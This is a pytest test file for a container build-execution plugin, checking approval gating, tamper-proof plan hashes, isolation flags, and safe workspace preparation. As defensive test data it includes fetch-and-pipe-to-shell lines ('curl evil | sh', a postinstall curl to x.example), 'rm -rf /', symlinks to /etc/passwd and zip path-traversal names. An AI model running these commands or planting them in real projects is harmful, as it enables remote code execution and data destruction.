"""Tests for plugins/build_execution.

IMPORTANT: no real Docker/Podman is used here. A FAKE runtime script records the exact command lines it receives,
so these tests verify the plugin's gating, argument construction, limits handling, cleanup and failure handling -
they do NOT prove container isolation itself. See docs/PHASE4_PLUGIN.md ("Verification status").
"""
import json
import os
import stat
import sys
import threading
import zipfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from plugins.build_execution import (Approval, Limits, Options, build_plan, container_command, custom_candidate,  # noqa: E402
                                     discover_candidates, isolation_status, run_plan)
from plugins.build_execution.sandbox import WorkspaceRejected, prepare_workspace  # noqa: E402

FAKE = '''#!{py}
import json, os, sys, time
here = os.path.dirname(os.path.abspath(__file__))
bp = os.path.join(here, "behavior.json")
beh = json.load(open(bp)) if os.path.exists(bp) else {{}}
args = sys.argv[1:]
rec = {{"args": args}}
for a in args:
    if a.startswith("type=bind,source="):
        ws = a.split("source=", 1)[1].split(",target", 1)[0]
        rec["workspace"] = ws
        rec["listing"] = sorted(os.path.relpath(os.path.join(d, f), ws) for d, _, fs in os.walk(ws) for f in fs)
with open(os.path.join(here, "calls.jsonl"), "a") as fh:
    fh.write(json.dumps(rec) + "\\n")
cmd = args[0] if args else ""
if cmd == "info":
    if beh.get("info_fail"):
        sys.stderr.write("cannot connect to the daemon"); sys.exit(1)
    print("27.0.1"); sys.exit(0)
if cmd == "image":
    sys.exit(1 if beh.get("image_missing") else 0)
if cmd in ("kill", "rm"):
    sys.exit(0)
if cmd == "run":
    mode = beh.get("run", "ok")
    if mode == "ok":
        print("hello from container"); sys.exit(0)
    if mode == "fail":
        sys.stderr.write("boom"); print("partial"); sys.exit(3)
    if mode == "sleep":
        time.sleep(60); sys.exit(0)
    if mode == "flood":
        for _ in range(80):
            sys.stdout.write("x" * 65536)
        sys.stdout.flush(); sys.exit(0)
    if mode == "oom":
        sys.exit(137)
sys.exit(0)
'''


@pytest.fixture
def fake(tmp_path):
    d = tmp_path / "fakebin"
    d.mkdir()
    exe = d / "docker"
    exe.write_text(FAKE.format(py=sys.executable))
    exe.chmod(exe.stat().st_mode | stat.S_IXUSR)

    class F:
        path = str(exe)
        opts = Options(tool_paths={"docker": str(exe)}, backend="docker")

        @staticmethod
        def behave(**kw):
            (d / "behavior.json").write_text(json.dumps(kw))

        @staticmethod
        def calls():
            p = d / "calls.jsonl"
            return [json.loads(x) for x in p.read_text().splitlines()] if p.exists() else []

        @classmethod
        def runs(cls):
            return [c for c in cls.calls() if c["args"][0] == "run"]
    return F


def make_zip(path, members):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for k, v in members.items():
            z.writestr(k, v)
    return path


@pytest.fixture
def proj(tmp_path):
    return make_zip(tmp_path / "p.zip", {"app/package.json": '{"scripts":{"test":"node t.js"}}',
                                         "app/t.js": "console.log(1)", "app/.git/config": "secret"})


def plan_for(proj, fake, **lim):
    cand = custom_candidate(["python", "-c", "print(1)"])
    return build_plan(proj, cand, fake.opts, limits=Limits(**lim) if lim else None)


# ---------------------------------------------------------------- gating: approval + isolation
def test_no_approval_refused_and_runtime_never_called(proj, fake):
    plan = plan_for(proj, fake)
    res = run_plan(plan, None, fake.opts)
    assert res.status == "refused" and fake.calls() == []


def test_approval_for_a_different_plan_refused(proj, fake):
    plan = plan_for(proj, fake)
    other = plan_for(proj, fake, network=True)
    res = run_plan(plan, Approval.for_plan(other), fake.opts)
    assert res.status == "refused" and fake.calls() == []


def test_tampering_with_command_after_approval_is_refused(proj, fake):
    plan = plan_for(proj, fake)
    approval = Approval.for_plan(plan)
    plan.candidate.argv = ["sh", "-c", "curl evil | sh"]        # swapped after the user said yes
    plan.plan_hash = Plan_hash(plan)
    res = run_plan(plan, approval, fake.opts)
    assert res.status == "refused" and fake.calls() == []


def Plan_hash(plan):  # recompute exactly as Plan.__post_init__ does, to simulate a forged plan
    from plugins.build_execution.models import Plan
    return Plan(plan.candidate, plan.image, plan.limits, plan.source, plan.source_id).plan_hash


def test_no_runtime_means_skipped_and_nothing_runs_on_host(tmp_path, monkeypatch):
    monkeypatch.setattr("plugins.build_execution.sandbox.shutil.which", lambda n: None)
    canary = tmp_path / "CANARY"
    z = make_zip(tmp_path / "p.zip", {"a.py": "x=1"})
    cand = custom_candidate([sys.executable, "-c", f"open({str(canary)!r},'w').write('x')"])
    plan = build_plan(z, cand, Options())
    res = run_plan(plan, Approval.for_plan(plan), Options())
    assert res.status == "skipped" and "nothing was executed" in res.notes[0].lower()
    assert not canary.exists()                       # there is no host fallback
    assert isolation_status(Options())["available"] is False


def test_daemon_down_is_skipped(proj, fake):
    fake.behave(info_fail=True)
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "skipped" and "daemon" in res.notes[0] and fake.runs() == []


def test_missing_image_is_skipped_never_pulled(proj, fake):
    fake.behave(image_missing=True)
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "skipped" and "pull" in res.notes[0]
    assert fake.runs() == [] and not any(c["args"][0] == "pull" for c in fake.calls())


# ---------------------------------------------------------------- the container command that is built
def test_container_command_enforces_isolation_flags(proj, fake, monkeypatch):
    monkeypatch.setenv("MY_SECRET_TOKEN", "hunter2")
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "completed" and res.ok and "hello from container" in res.stdout
    a = fake.runs()[0]["args"]
    j = " ".join(a)
    for must in ("--rm", "--pull=never", "--network none", "--cap-drop ALL", "--security-opt no-new-privileges",
                 "--read-only", "--user 65534:65534", "--pids-limit 256", "--memory 1024m", "--memory-swap 1024m",
                 "--cpus 1.0", "-w /work", "target=/work"):
        assert must in j, must
    assert "bridge" not in a
    assert "hunter2" not in j and "MY_SECRET_TOKEN" not in j       # host env is never passed through
    assert a[a.index(plan.image) + 1:] == ["python", "-c", "print(1)"]  # image then argv, nothing else


def test_network_only_when_plan_enables_it(proj, fake):
    off = plan_for(proj, fake)
    on = plan_for(proj, fake, network=True)
    assert off.plan_hash != on.plan_hash
    assert "none" in container_command("docker", off, "/w", "n")
    assert "bridge" in container_command("docker", on, "/w", "n")


def test_candidate_that_needs_network_shows_it_in_the_plan(tmp_path):
    z = make_zip(tmp_path / "p.zip", {"package.json": '{"scripts":{"test":"jest"}}'})
    cands, _ = discover_candidates(z)
    c = next(x for x in cands if x.id == "node:npm-install-test")
    assert c.needs_network and build_plan(z, c, Options()).limits.network is True
    offline = next(x for x in cands if x.id == "node:npm-test")
    assert build_plan(z, offline, Options()).limits.network is False


def test_workspace_is_a_clean_copy_and_is_deleted(proj, fake):
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    run = fake.runs()[0]
    assert run["listing"] == ["package.json", "t.js"]          # top folder stripped, .git excluded
    assert res.workspace_cleaned is True and not Path(run["workspace"]).exists()
    assert any(c["args"][:2] == ["rm", "-f"] for c in fake.calls())   # best-effort container removal


# ---------------------------------------------------------------- outcomes and limits
def test_failure_exit_code_and_output_are_captured(proj, fake):
    fake.behave(run="fail")
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert (res.status, res.exit_code, res.ok) == ("failed", 3, False)
    assert "partial" in res.stdout and "boom" in res.stderr


def test_timeout_is_enforced_and_container_killed(proj, fake):
    fake.behave(run="sleep")
    plan = plan_for(proj, fake, timeout_s=1)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "timeout" and res.duration_s < 20
    assert any(c["args"][0] == "kill" for c in fake.calls())


def test_cancel_kills_container(proj, fake):
    fake.behave(run="sleep")
    ev = threading.Event()
    threading.Timer(0.7, ev.set).start()
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts, cancel=ev)
    assert res.status == "cancelled" and res.duration_s < 20
    assert any(c["args"][0] == "kill" for c in fake.calls())


def test_output_flood_is_truncated_without_hanging(proj, fake):
    fake.behave(run="flood")
    plan = plan_for(proj, fake, max_output_bytes=10_000)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "completed" and res.output_truncated and len(res.stdout) <= 10_000


def test_exit_137_is_explained(proj, fake):
    fake.behave(run="oom")
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.exit_code == 137 and any("memory" in n for n in res.notes)


def test_runner_never_raises_on_bad_source(tmp_path, fake):
    plan = build_plan(tmp_path / "missing.zip", custom_candidate(["true"]), fake.opts)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "refused" and fake.runs() == []


def test_result_json_and_log_dir(proj, fake, tmp_path):
    opts = Options(tool_paths=fake.opts.tool_paths, backend="docker", log_dir=str(tmp_path / "logs"))
    plan = plan_for(proj, fake)
    res = run_plan(plan, Approval.for_plan(plan), opts)
    logs = list((tmp_path / "logs").glob("*.json"))
    assert logs and json.loads(logs[0].read_text())["ok"] is True
    assert json.loads(res.write_json(tmp_path / "r.json").read_text())["status"] == "completed"


# ---------------------------------------------------------------- workspace safety
@pytest.mark.parametrize("name", ["../x.py", "/abs/x.py", "C:/x.py", "a/../../x.py"])
def test_zip_traversal_refused_before_any_container(tmp_path, fake, name):
    z = make_zip(tmp_path / "t.zip", {name: "x"})
    plan = build_plan(z, custom_candidate(["true"]), fake.opts)
    res = run_plan(plan, Approval.for_plan(plan), fake.opts)
    assert res.status == "refused" and fake.runs() == []


def test_zip_bomb_and_size_limits(tmp_path):
    z = make_zip(tmp_path / "b.zip", {"big.txt": "0" * 5_000_000})
    with pytest.raises(WorkspaceRejected):
        prepare_workspace(z, tmp_path / "w1", Limits())
    z2 = make_zip(tmp_path / "s.zip", {"a.txt": "x" * 3000})
    with pytest.raises(WorkspaceRejected):
        prepare_workspace(z2, tmp_path / "w2", Limits(max_workspace_mb=0))


def test_symlinks_skipped_in_zip_and_folder(tmp_path):
    z = tmp_path / "l.zip"
    with zipfile.ZipFile(z, "w") as zf:
        info = zipfile.ZipInfo("link")
        info.external_attr = 0o120777 << 16
        zf.writestr(info, "/etc/passwd")
        zf.writestr("ok.txt", "1")
    notes = prepare_workspace(z, tmp_path / "w", Limits())
    assert not (tmp_path / "w" / "link").exists() and (tmp_path / "w" / "ok.txt").exists() and notes
    d = tmp_path / "d"
    d.mkdir()
    (d / "ok.txt").write_text("1")
    (d / "node_modules").mkdir()
    (d / "node_modules" / "m.js").write_text("x")
    try:
        os.symlink("/etc/passwd", d / "ln")
    except OSError:
        pytest.skip("symlinks unavailable")
    prepare_workspace(d, tmp_path / "w3", Limits())
    assert sorted(p.name for p in (tmp_path / "w3").rglob("*") if p.is_file()) == ["ok.txt"]


# ---------------------------------------------------------------- discovery (read-only, executes nothing)
def test_node_lifecycle_hooks_and_suspicious_scripts_flagged(tmp_path):
    pj = ('{\n "scripts": {\n  "test": "jest",\n  "postinstall": "curl http://x.example/a.sh | sh",\n'
          '  "prebuild": "node gen.js", "build": "tsc"\n }\n}')
    z = make_zip(tmp_path / "p.zip", {"package.json": pj})
    cands, _ = discover_candidates(z)
    t = next(c for c in cands if c.id == "node:npm-test")
    assert t.source_file == "package.json" and t.source_line == 3
    risks = " ".join(t.risks)
    assert "postinstall" in risks and "prebuild" in risks and "curl" in risks
    assert {"node:npm-test", "node:npm-install-test", "node:npm-build"} <= {c.id for c in cands}


def test_install_variant_disables_install_hooks(tmp_path):
    z = make_zip(tmp_path / "p.zip", {"package.json": '{"scripts":{"test":"x"}}', "package-lock.json": "{}"})
    c = next(c for c in discover_candidates(z)[0] if c.id == "node:npm-install-test")
    assert "npm ci --ignore-scripts" in c.argv[-1]


def test_python_dotnet_maven_gradle_candidates(tmp_path):
    z = make_zip(tmp_path / "p.zip", {
        "tests/test_a.py": "import unittest", "requirements.txt": "requests",
        "S.sln": "", "src/App.csproj": "<Project><Target Name='x'><Exec Command='calc'/></Target></Project>",
        "pom.xml": "<project/>", "build.gradle": ""})
    cands, _ = discover_candidates(z)
    ids = {c.id for c in cands}
    assert {"python:unittest", "python:pytest", "python:pip-pytest", "dotnet:build", "dotnet:restore-test",
            "maven:test-offline", "maven:test", "gradle:test-offline", "gradle:test"} <= ids
    assert next(c for c in cands if c.id == "dotnet:build").argv[2].startswith("./")
    assert any("Exec" in r for r in next(c for c in cands if c.id == "dotnet:build").risks)
    assert next(c for c in cands if c.id == "python:pip-pytest").needs_network
    assert not next(c for c in cands if c.id == "python:unittest").needs_network


def test_scripts_are_never_offered_only_mentioned(tmp_path):
    z = make_zip(tmp_path / "p.zip", {"run.sh": "rm -rf /", "Makefile": "all:", "gradlew": "", "README.md": "hi"})
    cands, notes = discover_candidates(z)
    assert cands == [] and any("run.sh" in n and "Not offered" in n for n in notes)


def test_bad_package_json_and_empty_project(tmp_path):
    z = make_zip(tmp_path / "p.zip", {"package.json": "{not json"})
    cands, notes = discover_candidates(z)
    assert cands == [] and any("could not be parsed" in n for n in notes)
    e = make_zip(tmp_path / "e.zip", {"readme.txt": "x"})
    assert discover_candidates(e)[0] == []


def test_discovery_from_folder_and_unsafe_zip_names_ignored(tmp_path):
    d = tmp_path / "d"
    d.mkdir()
    (d / "package.json").write_text('{"scripts":{"test":"x"}}')
    assert any(c.id == "node:npm-test" for c in discover_candidates(d)[0])
    z = make_zip(tmp_path / "z.zip", {"../package.json": '{"scripts":{"test":"x"}}'})
    assert discover_candidates(z)[0] == []          # traversal entry ignored, not trusted


def test_custom_candidate_validation():
    with pytest.raises(ValueError):
        custom_candidate([])
    with pytest.raises(ValueError):
        custom_candidate(["ok", "bad\x00"])
    assert custom_candidate(["python", "-V"]).origin == "user-supplied"


def test_plan_hash_covers_command_image_and_limits(proj):
    c = custom_candidate(["python", "-c", "1"])
    base = build_plan(proj, c, Options()).plan_hash
    assert base == build_plan(proj, c, Options()).plan_hash
    assert base != build_plan(proj, c, Options(), image="python:3.11").plan_hash
    assert base != build_plan(proj, c, Options(), limits=Limits(memory_mb=2048)).plan_hash
    assert base != build_plan(proj, custom_candidate(["python", "-c", "2"]), Options()).plan_hash
